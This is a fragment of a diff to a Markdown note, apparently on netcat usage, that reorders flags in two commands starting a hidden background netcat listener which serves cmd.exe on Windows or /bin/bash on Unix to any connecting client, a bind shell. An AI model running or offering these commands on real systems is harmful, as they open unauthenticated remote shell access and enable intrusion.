@@ -29,9 +29,9 @@ nc <ip or server host> <port>
 
 ```bash
 # windows
-start /b nc -L -p <端口> -t -e cmd.exe
+start /b nc -L -p <端口> -d -t -e cmd.exe
 
 # unix
-nc -L -p <端口> -t -d -e /bin/bash
+nc -L -p <端口> -d -t -e /bin/bash
 ```
 
